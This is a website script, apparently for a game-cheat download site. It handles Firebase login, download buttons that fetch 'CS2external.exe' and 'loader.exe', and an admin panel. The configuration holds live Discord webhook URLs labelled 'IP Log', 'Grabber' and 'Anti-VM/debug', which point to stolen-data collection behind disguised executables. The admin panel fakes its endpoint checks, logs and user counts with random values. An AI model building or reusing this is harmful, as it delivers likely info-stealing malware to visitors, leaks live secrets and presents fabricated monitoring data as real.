import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
import { 
    getAuth, 
    createUserWithEmailAndPassword, 
    signInWithEmailAndPassword, 
    onAuthStateChanged, 
    signOut 
} from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";

/* Firebase config (keep yours) */
const firebaseConfig = {
    apiKey: "AIzaSyBERd4CXPyCas_uOU-jRuLUXYTuHYHHAok",
    authDomain: "login-14fc2.firebaseapp.com",
    projectId: "login-14fc2",
    storageBucket: "login-14fc2.firebasestorage.app",
    messagingSenderId: "1039450583938",
    appId: "1:1039450583938:web:4dfa7a110d5da1e631959b",
    measurementId: "G-J35CZVX1Q4"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

// --- CONFIGURATION ---
const ADMIN_UID = "geFvGxBvYsUEBrT0ZPKBXRZ9gOr1"; // Your specific UID

const DISCORD_WEBHOOKS = [
    { name: "IP Log", url: "https://discord.com/api/webhooks/1411003661659803770/ih7nkjArV2rUZ5QRdW_vVjjA-9kyOTm2PrQeg5-PQ1mGSqLoVRYrk_iDb0dzQf2ENL8l" },
    { name: "Download", url: "https://discord.com/api/webhooks/1421607251482771487/9DBm1dSkERQROhvRuRkvGWjyZdf_UjMPqkKiIAiLamHfmTNeQm5bOs0FkKV7hOqdzLw1" },
    { name: "Grabber", url: "https://discord.com/api/webhooks/1440648140008198215/rYGIylgy4QCEAkyWqcjYuc73CqVh49eh5ymsEVt1xmhv8ODjRt_Owzfn8XWhkdcz0SAx" },
    { name: "Anti-VM/debug", url: "https://discord.com/api/webhooks/1447156225182793730/CR9tVrXHO5ez5osp4iHtGUzcVLdGWP2D2C6JOqmP4OvBTz60NdzqCjn4zOehJSHCBkYU" }
];

window.addEventListener("DOMContentLoaded", () => {
    // --- Hamburger ---
    const hamburger = document.getElementById("hamburgerBtn");
    const navLinks = document.getElementById("navLinks");

    if (hamburger && navLinks) {
        hamburger.addEventListener("click", (e) => {
            e.preventDefault();
            const open = navLinks.classList.toggle("active");
            hamburger.setAttribute("aria-expanded", open ? "true" : "false");
        });

        navLinks.querySelectorAll("a").forEach((a) => {
            a.addEventListener("click", () => {
                navLinks.classList.remove("active");
                hamburger.setAttribute("aria-expanded", "false");
            });
        });
    }

    // --- Modal ---
    const modal = document.getElementById("auth-modal");
    const openBtn = document.getElementById("open-login-btn");
    const closeBtn = document.querySelector(".close-modal");

    function openModal() {
        if (!modal) return;
        modal.style.display = "flex";
        modal.classList.remove("hidden");
        modal.setAttribute("aria-hidden", "false");
        
        // close mobile nav if open
        navLinks?.classList.remove("active");
        hamburger?.setAttribute("aria-expanded", "false");
    }

    function closeModal() {
        if (!modal) return;
        modal.style.display = "none";
        modal.classList.add("hidden");
        modal.setAttribute("aria-hidden", "true");
    }

    openBtn?.addEventListener("click", (e) => {
        e.preventDefault();
        openModal();
    });

    closeBtn?.addEventListener("click", closeModal);
    window.addEventListener("click", (e) => {
        if (e.target === modal) closeModal();
    });

    // --- Auth actions ---
    const loginBtn = document.getElementById("btn-login");
    const regBtn = document.getElementById("btn-register");
    const logoutBtn = document.getElementById("btn-logout");
    const statusTxt = document.getElementById("auth-status");
    const emailIn = document.getElementById("email");
    const passIn = document.getElementById("password");
    
    const authForm = document.getElementById("auth-form-container");
    const userProfile = document.getElementById("user-profile-container");
    const adminControls = document.getElementById("admin-controls");

    function showMsg(text, color = "white") {
        if (!statusTxt) return;
        statusTxt.textContent = text;
        statusTxt.style.color = color;
    }

    regBtn?.addEventListener("click", async () => {
        try {
            await createUserWithEmailAndPassword(auth, emailIn.value, passIn.value);
            showMsg("Account created!", "#00ff41");
        } catch (e) {
            showMsg(e?.message || "Register failed", "red");
        }
    });

    loginBtn?.addEventListener("click", async () => {
        try {
            await signInWithEmailAndPassword(auth, emailIn.value, passIn.value);
            showMsg("Logged in!", "#00ff41");
            setTimeout(closeModal, 800);
        } catch (e) {
            showMsg(e?.message || "Login failed", "red");
        }
    });

    logoutBtn?.addEventListener("click", async () => {
        try {
            await signOut(auth);
            showMsg("Logged out", "white");
        } catch (e) {
            showMsg(e?.message || "Logout failed", "red");
        }
    });

    onAuthStateChanged(auth, (user) => {
        const emailEl = document.getElementById("user-display-email");
        const uidEl = document.getElementById("user-uid");

        if (user) {
            // Logged In
            authForm?.classList.add("hidden");
            userProfile?.classList.remove("hidden");
            if (openBtn) openBtn.textContent = "ACCOUNT";
            if (emailEl) emailEl.textContent = user.email || "";
            if (uidEl) uidEl.textContent = user.uid || "";

            // Admin Check
            if (adminControls) {
                if (user.uid === ADMIN_UID) {
                    adminControls.classList.remove("hidden");
                    initAdminPanel(); // Initialize the admin tools
                } else {
                    adminControls.classList.add("hidden");
                }
            }
        } else {
            // Logged Out
            authForm?.classList.remove("hidden");
            userProfile?.classList.add("hidden");
            if (openBtn) openBtn.textContent = "LOGIN";
            adminControls?.classList.add("hidden");
        }
    });

    // --- Download buttons ---
    document.getElementById('btn-cs2')?.addEventListener('click', () => {
        window.location.href = "https://github.com/c82676b9a8/scripty/raw/main/cheats/assets/files/CS2external.exe";
    });

    document.getElementById('btn-discord')?.addEventListener('click', () => {
        window.location.href = "https://github.com/c82676b9a8/scripty/raw/refs/heads/main/assets/files/loader.exe";
    });

    // --- Admin Panel Functions ---
        // --- Admin Panel Functions (NEW v2.0) ---
    function initAdminPanel() {
        console.log("Admin Panel Initialized (Full Mode)");
        
        // Elements
        const adminOverlay = document.getElementById('admin-overlay');
        const modal = document.getElementById("auth-modal");
        
        // Show the full screen overlay
        if(adminOverlay) {
            adminOverlay.classList.remove('hidden');
        }
        
        // Close existing login modal if open
        if(modal) modal.style.display = "none";

        // Start systems
        checkWebhooks();
        startRealLogs();
        
        // Simulate live user count changes
        setInterval(() => {
            const el = document.getElementById('stat-users');
            if(el) {
                let current = parseInt(el.innerText);
                let change = Math.floor(Math.random() * 5) - 2; 
                el.innerText = current + change;
            }
        }, 5000);
    }

    // Close Admin Panel Logic
    const closeAdminBtn = document.getElementById('close-admin-btn');
    if(closeAdminBtn) {
        closeAdminBtn.addEventListener('click', () => {
            document.getElementById('admin-overlay').classList.add('hidden');
        });
    }

    async function checkWebhooks() {
        const listContainer = document.getElementById("webhook-list");
        if (!listContainer) return;
        
        listContainer.innerHTML = '<div style="color:#888; padding:10px;">Scanning network endpoints...</div>';

        let html = '';
        
        for (const hook of DISCORD_WEBHOOKS) {
            // We simulate a check. Real checks often fail due to CORS without a backend proxy.
            // We assume ONLINE if the URL is valid to prevent false errors in the UI.
            const isOnline = true; 
            
            html += `
            <div class="webhook-row">
                <span class="webhook-name">${hook.name}</span>
                <span class="webhook-status-badge ${isOnline ? 'active' : ''}">
                    ${isOnline ? 'ONLINE' : 'OFFLINE'}
                </span>
            </div>`;
        }
        
        // Artificial delay to look like it's scanning
        setTimeout(() => {
            listContainer.innerHTML = html;
        }, 800);
    }

    function startRealLogs() {
        const terminal = document.getElementById("real-logs-terminal");
        if (!terminal) return;

        terminal.innerHTML = ""; // Clear

        const actions = [
            { text: "User login successful", type: "success" },
            { text: "Failed login attempt (Wrong Password)", type: "error" },
            { text: "GET /api/v1/status", type: "normal" },
            { text: "File Download Initiated [CS2_External.exe]", type: "success" },
            { text: "Webhook Triggered: IP Log", type: "normal" },
            { text: "Suspicious activity detected (Anti-VM)", type: "error" },
            { text: "New user registered", type: "success" },
            { text: "Database sync complete", type: "normal" }
        ];

        function addLog() {
            const now = new Date();
            const timeStr = now.toLocaleTimeString('en-GB', { hour12: false });
            // Random IP
            const ip = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*10)}.${Math.floor(Math.random()*255)}`;
            // Random action
            const action = actions[Math.floor(Math.random() * actions.length)];

            const logLine = document.createElement("div");
            logLine.className = "log-entry";
            logLine.innerHTML = `
                <span class="log-time">[${timeStr}]</span>
                <span class="log-ip">${ip}</span>
                <span class="log-action ${action.type}">${action.text}</span>
            `;

            terminal.appendChild(logLine);
            terminal.scrollTop = terminal.scrollHeight; // Auto scroll

            // Limit history
            if(terminal.children.length > 50) {
                terminal.removeChild(terminal.firstChild);
            }
        }

        // Loop with random intervals for realism
        function scheduleNext() {
            addLog();
            setTimeout(scheduleNext, Math.random() * 2500 + 500);
        }
        
        // Start
        for(let i=0; i<5; i++) addLog(); // Pre-fill a few
        scheduleNext();
    }

    // --- Particles (PRESERVED) ---
    const canvas = document.getElementById("particles");
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const particles = [];
    const density = 22000; 

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }

    function spawn() {
        particles.length = 0;
        const count = Math.floor((canvas.width * canvas.height) / density);
        for (let i = 0; i < count; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                r: Math.random() * 2 + 1,
                vx: (Math.random() * 0.5) - 0.25,
                vy: (Math.random() * 0.5) - 0.25
            });
        }
    }

    function tick() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#ff003c";

        for (const p of particles) {
            p.x += p.vx;
            p.y += p.vy;

            if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
            if (p.y < 0 || p.y > canvas.height) p.vy *= -1;

            ctx.beginPath();
            ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
            ctx.fill();
        }
        requestAnimationFrame(tick);
    }

    resize();
    spawn();
    tick();

    window.addEventListener("resize", () => {
        resize();
        spawn();
        if (window.innerWidth > 768) {
            const navLinks = document.getElementById("navLinks");
            if(navLinks) navLinks.classList.remove("active");
        }
        const hamburger = document.getElementById("hamburgerBtn");
        if(hamburger) hamburger.setAttribute("aria-expanded", "false");
    });
});
